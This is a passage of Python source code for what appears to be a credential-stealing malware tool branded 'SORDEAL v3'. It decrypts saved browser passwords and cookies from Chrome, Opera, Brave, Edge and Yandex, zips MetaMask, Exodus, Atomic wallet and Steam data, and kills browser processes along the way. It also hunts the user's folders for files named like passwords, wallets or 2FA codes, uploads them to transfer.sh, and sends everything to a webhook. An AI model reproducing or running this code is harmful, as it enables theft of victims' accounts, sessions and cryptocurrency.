    while "net" in e:
        e.remove("net")
    return list(set(e))


def upload(name, tk=""):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    if name == "check_spec_bc":
        data = {
            "content": "",
            "embeds": [
                {
                    "fields": [
                        {"name": "Interesting files found on user PC:", "value": tk}
                    ],
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "footer": {"text": "github.com/SORDEAL"},
                    "color": 16711718,
                }
            ],
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "attachments": [],
        }
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
        return
    path = name
    files = {"file": open(path, "rb")}

    if "SO_allpasswords" in name:
        ra = " | ".join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = " | ".join(da for da in rrr)
        data = {
            "content": "",
            "embeds": [
                {
                    "fields": [{"name": "Passwords Found:", "value": ra}],
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "footer": {
                        "text": "github.com/SORDEAL",
                    },
                    "color": 16711718,
                }
            ],
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "attachments": [],
        }
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
    if "SO_allcookies" in name:
        rb = " | ".join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = " | ".join(da for da in rrrrr)
        data = {
            "content": "",
            "embeds": [
                {
                    "fields": [{"name": "Cookies Found:", "value": rb}],
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "footer": {
                        "text": "github.com/SORDEAL",
                    },
                    "color": 16711718,
                }
            ],
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "attachments": [],
        }
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
    Requests_loading("POST", hook, files=files)


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode="w", encoding="utf-8") as f:
        f.write(f"Created BY SHAMAN | https://github.com/Sordeal\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")


NotPSSW = []


def Find_Passw(path, arg):
    global NotPSSW
    if not os.path.exists(path):
        return
    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0:
        return
    tempfold = (
        temp
        + "SO_is_here"
        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
        + ".db"
    )
    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in paswWords:
                        paswWords.append(old)
            NotPSSW.append(
                f"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {Value_Dcryptage(row[2], master_key)}\n\n"
            )
    writeforfile(NotPSSW, "SO_allpasswords")


Cookies = []


def Get_SO_Cook(path, arg):
    global Cookies
    if not os.path.exists(path):
        return
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0:
        return
    tempfold = (
        temp
        + "SO_is_here"
        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in cookiWords:
                        cookiWords.append(old)
            Cookies.append(
                f"{row[0]}	TRUE"
                + "		"
                + f"/FALSE	2597573456	{row[1]}	{Value_Dcryptage(row[2], master_key)}"
            )
    writeforfile(Cookies, "SO_allcookies")


def checkIfProcessRunning(processName):
    """
    Check if there is any running process that contains the given name processName.
    """
    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False


def ZipMyThings(path, arg, procc):
    pathC = path
    name = arg
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Exodus_{browser}"
        pathC = path + arg
    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Metamask_{browser}"
        pathC = path + arg
    if not os.path.exists(pathC):
        return
    if checkIfProcessRunning("chrome.exe"):
        print("Yes a chrome process was running")
        subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    else:
        ...
    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"
    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False:
            return
        name = arg
    zf = zipfile.ZipFile(f"{pathC}/{name}.zip", "w")
    print(zf)
    for file in os.listdir(pathC):
        if not ".zip" in file:
            zf.write(pathC + "/" + file)
    zf.close()

    upload(f"{pathC}/{name}.zip")
    os.remove(f"{pathC}/{name}.zip")


def SO_Gather_All():
    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
    browserPaths = [
        [
            f"{roaming}/Opera Software/Opera GX Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Neon/User Data/Default",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome SxS/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/BraveSoftware/Brave-Browser/User Data",
            "brave.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Yandex/YandexBrowser/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Microsoft/Edge/User Data",
            "edge.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
    ]

    Paths_zipped = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [
            f"{roaming}/NationsGlory/Local Storage/leveldb",
            "NationsGlory.exe",
            "NationsGlory",
        ],
    ]

    for patt in browserPaths:
        a = threading.Thread(target=Find_Passw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)
    thread_bccookies = []
    for patt in browserPaths:
        a = threading.Thread(target=Get_SO_Cook, args=[patt[0], patt[4]])
        a.start()
        thread_bccookies.append(a)
    for thread in thread_bccookies:
        thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True:
        return
    for patt in browserPaths:
        threading.Thread(target=ZipMyThings, args=[patt[0], patt[5], patt[1]]).start()
    for patt in Paths_zipped:
        threading.Thread(target=ZipMyThings, args=[patt[0], patt[2], patt[1]]).start()
    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["SO_allpasswords.txt", "SO_allcookies.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)


def UploadTo_Anon(path):
    try:
        files = {"file": (path, open(path, mode="rb"))}
        ...
        upload = requests.post("https://transfer.sh/", files=files)
        url = upload.text
        return url
    except:
        return False


def CreateFolder_(pathF, keywords):
    global SO_create_files
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = UploadTo_Anon(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    SO_create_files.append(["folder", pathF + "/", ffound])


SO_create_files = []


def SO_create_file(path, keywords):
    global SO_create_files
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append(
                        [path + "/" + file, UploadTo_Anon(path + "/" + file)]
                    )
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    CreateFolder_(target, keywords)
                    break
    SO_create_files.append(["folder", path, fifound])


def check_spec_bc():
    user = temp.split("\AppData")[0]
    path2search = [user + "/Desktop", user + "/Downloads", user + "/Documents"]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret",
    ]

    wikith = []
    for patt in path2search:
        check_spec_bc = threading.Thread(
            target=SO_create_file, args=[patt, key_wordsFiles]
        )
        check_spec_bc.start()
        wikith.append(check_spec_bc)
    return wikith


global keyword, cookiWords, paswWords

keyword = [
    "mail",
    "[coinbase](https://coinbase.com)",
    "[sellix](https://sellix.io)",
    "[gmail](https://gmail.com)",
    "[steam](https://steam.com)",
    "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)",
    "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)",
    "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)",
    "[facebook](https://facebook.com)",
    "card",
    "[epicgames](https://epicgames.com)",
    "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)",
    "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)",
    "[minecraft](https://minecraft.net)",
    "bank",
    "[paypal](https://paypal.com)",
    "[origin](https://origin.com)",
    "[amazon](https://amazon.com)",
    "[ebay](https://ebay.com)",
    "[aliexpress](https://aliexpress.com)",
    "[playstation](https://playstation.com)",
    "[hbo](https://hbo.com)",
    "[xbox](https://xbox.com)",
    "buy",
    "sell",
    "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)",
    "[outlook](https://outlook.com)",
    "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)",
    "[pornhub](https://pornhub.com)",
    "[disney](https://disney.com)",
    "[expressvpn](https://expressvpn.com)",
    "crypto",
    "[uber](https://uber.com)",
    "[netflix](https://netflix.com)",
]


cookiWords = []
paswWords = []

SO_Gather_All()
DETECTED = Trust(Cookies)

if not DETECTED:
    wikith = check_spec_bc()

    for thread in wikith:
        thread.join()
    time.sleep(0.2)

    filetext = "```diff\n"
    for arg in SO_create_files:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f"\n"
            filetext += f"- {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a) - 1]
                b = ffil[1]
                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
                filetext += "\n"
    filetext += "\n```"

    upload("check_spec_bc", filetext)
    auto = threading.Thread(target=auto_copy_wallet().run)
    auto.start()
